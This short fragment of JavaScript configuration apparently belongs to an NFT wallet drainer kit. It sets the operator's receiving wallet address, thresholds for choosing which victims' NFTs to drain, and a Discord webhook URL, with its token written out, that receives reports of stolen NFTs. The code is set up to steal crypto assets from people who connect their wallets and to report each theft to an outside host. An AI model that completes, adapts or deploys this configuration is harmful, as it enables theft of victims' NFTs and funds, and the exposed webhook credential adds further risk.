...
const receiveAddress = "0x54926CbfEa959e9E46eb82a74dfE9667d428Da87"; // YOUR WALLET ADDRESS


const drainNftsInfo = {
    minValue: 0.0015, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 1000,
}
...
const discordWebhookURL = "https://discord.com/api/webhooks/1074800768177143998/sgygvMZD-GnpHdaqJdMghqY_RuSPV63c3KbEEsQtnFM3QDHTCOWZqAvD3JdiePYsQ1tI"; // put ur discord webhook url in here to receive NFT's
